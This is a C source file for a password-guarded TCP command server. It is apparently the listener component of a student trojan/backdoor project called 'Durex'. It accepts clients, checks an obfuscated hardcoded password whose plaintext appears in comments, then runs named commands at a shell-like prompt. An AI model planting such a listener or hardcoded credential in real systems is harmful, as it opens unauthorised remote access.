/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/15 03:19:03 by root              #+#    #+#             */
/*   Updated: 2018/07/19 04:35:35 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* getaddrinfo socket */
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#include "ft_dprintf.h"
#include "durex.h"

static int			openSocket(struct addrinfo *p)
{
	int				fd;
	int				on;

	on = 1;
	fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
	if (fd < 0)
		return -1;
	if (!setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on)) &&
		!bind(fd, p->ai_addr, p->ai_addrlen) &&
		!listen(fd, CLIENT_MAX))
		return fd;
	close(fd);
	return -1;
}

int					openServer(const char *addr, const char *port)
{
	int				fd;
	struct addrinfo	hints;
	struct addrinfo	*res;
	struct addrinfo	*p;

	fd = -1;
	memset(&hints, 0, sizeof(hints));
	hints.ai_flags = AI_PASSIVE | AI_CANONNAME;
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	if (getaddrinfo(addr, port, &hints, &res))
		return (-1);
	p = res;
	while (p != NULL)
	{
		if (p->ai_family == AF_INET)
			fd = openSocket(p);
		if (fd >= 0)
			break ;
		p = p->ai_next;
	}
	freeaddrinfo(res);
	if (p == NULL || fd < 0)
		return (-1);
	return fd;
}

void					serverAcceptConnections(t_sv *server)
{
	struct sockaddr		csin;
	socklen_t			len= sizeof(csin);
	int					fd;

	fd = accept(server->fd, &csin, &len);
	if (fd < 0)
		return ;
	for (int i = 0; i < CLIENT_MAX; i++) {
		if (server->client[i].fd == -1) {
			server->client[i].fd = fd;
			clientWrite("Pass: ", &server->client[i]);
			return ;
		}
	}
	write(fd, "Server Full\n", 13);
	close(fd);
}

static void			serverCommands(u_char *buff, int size, t_cl *client)
{
	static char		*cmd[] = { SERVER_COMMANDS };
	static void		(*func[])(t_cl *) = { SERVER_FUNCTIONS };

	if (!client->logged) {
		memset(buff + size, 0, CLIENT_BUFF - size);
		encrypt(buff, size);
		//kata (4): 201 121 30 74
		//KATA (4): 44 92 192 65
		//KatA (4): 116 103 224 84
		if (buff[0] == 201	&&
			buff[1] == 121	&&
			buff[2] == 30	&&
			buff[3] == 74) {
			client->logged = 1;
		} else {
			clientWrite("Pass: ", client);
			return ;
		}
	} else {
		for (size_t i = 0; i < sizeof(cmd) / sizeof(*cmd); i++) {
			if (!strcmp(cmd[i], (char *)buff)) {
				func[i](client);
				break ;
			}
		}
	}
	clientWrite("$> ", client);
}

void				serverReadClient(t_cl *client)
{
	char			buff[CLIENT_BUFF];
	int				ret;

	ret = read(client->fd, buff, CLIENT_BUFF);
	if (ret <= 0)
		return serverQuitClient(client);
	clientRead(buff, ret, client);
	/* Here we recreate the client rd buff to get a non truncated string */
	char *ptr = client->rd.tail;
	ret = 0;
	while (ptr != client->rd.head) {
		buff[ret++] = *ptr;
		if (*ptr == '\n') {
			buff[ret - 1] = '\0';
			serverCommands((u_char *)buff, ret - 1, client);
			ret = 0;
			client->rd.tail = moveTail(ptr, client->rd.buff, CLIENT_BUFF);
		}
		ptr = moveTail(ptr, client->rd.buff, CLIENT_BUFF);
	}
}

void				serverWriteClient(t_cl *client)
{
	int				ret;

	if (client->wr.head != client->wr.tail) {
		if (client->wr.head > client->wr.tail) {
			ret = write(client->fd, client->wr.tail, client->wr.head - client->wr.tail);
			client->wr.tail = client->wr.head;
		} else {
			ret = write(client->fd, client->wr.tail, client->wr.buff + CLIENT_BUFF - (client->wr.tail));
			client->wr.tail = client->wr.buff;
		}
		if (ret <= 0)
			return serverQuitClient(client);
	}
}

void				quitServer(t_sv *server)
{
	for (int i = 0; i < CLIENT_MAX; i++)
	{
		if (server->client[i].fd != -1)
			close(server->client[i].fd);
		clearClient(&server->client[i]);
	}
	if (server->fd != -1)
		close(server->fd);
	if (server->reporter != -1)
		close(server->reporter);
}
